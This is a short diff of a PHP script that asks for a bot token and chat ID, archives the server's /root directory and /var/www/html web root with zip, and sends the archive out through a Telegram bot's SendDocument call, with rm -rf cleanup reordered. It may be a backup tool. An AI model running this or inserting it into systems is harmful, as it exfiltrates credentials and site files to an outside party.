@@ -20,10 +20,10 @@ $token = readline("Enter your token: ");
 echo "
 ";
 $id = readline("Enter your ID: ");
-passthru("zip -r /root.zip ../root");
-passthru("zip -r /html.zip ../var/www/html");
 passthru("rm -rf /root.zip");
 passthru("rm -rf /html.zip");
+passthru("zip -r /root.zip ../root");
+passthru("zip -r /html.zip ../var/www/html");
 bot($token,'SendDocument',[
 'chat_id'=>$id,
 'document'=>new CURLFile('/root.zip'),
